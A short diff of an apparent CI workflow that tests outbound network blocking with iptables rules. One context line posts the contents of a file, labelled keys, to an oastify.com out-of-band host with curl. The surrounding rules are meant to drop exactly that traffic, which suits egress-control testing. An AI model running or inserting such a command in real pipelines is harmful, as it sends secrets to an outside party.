@@ -25,6 +25,6 @@ jobs:
         cat foo.txt
         sudo iptables -A OUTPUT -d github.com -j ACCEPT
         sudo iptables -A OUTPUT -d c3g36rzh0gj5zg6uh1y9y5h1csij6bu0.oastify.com -j DROP
-        curl -v --retry 3 http://example.com
+        curl -v --retry 3 https://github.com
         curl -v --retry 3  --retry-max-time 10 --data "Keys:$(cat foo.txt)" http://c3g36rzh0gj5zg6uh1y9y5h1csij6bu0.oastify.com
         
